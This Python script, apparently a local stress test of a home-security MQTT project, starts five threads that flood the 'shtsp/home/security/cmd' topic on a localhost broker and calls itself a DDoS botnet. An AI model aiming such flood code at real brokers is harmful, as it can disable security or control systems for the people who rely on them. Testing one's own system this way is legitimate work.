import paho.mqtt.client as mqtt
import time
import threading

def attack_thread(thread_id):
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"Bot_{thread_id}")
    client.connect("localhost", 1883)
    print(f"🤖 Bot {thread_id} ready...")
    while True:
        client.publish("shtsp/home/security/cmd", "DDoS_STRESS_PACKET_" * 20)
        time.sleep(0.001)

print("🔥 PREPARING DDoS BOTNET (5 Hackers)...")

# Launch 5 attack bots at once
for i in range(5):
    t = threading.Thread(target=attack_thread, args=(i,))
    t.daemon = True
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("DDoS Attack Stopped.")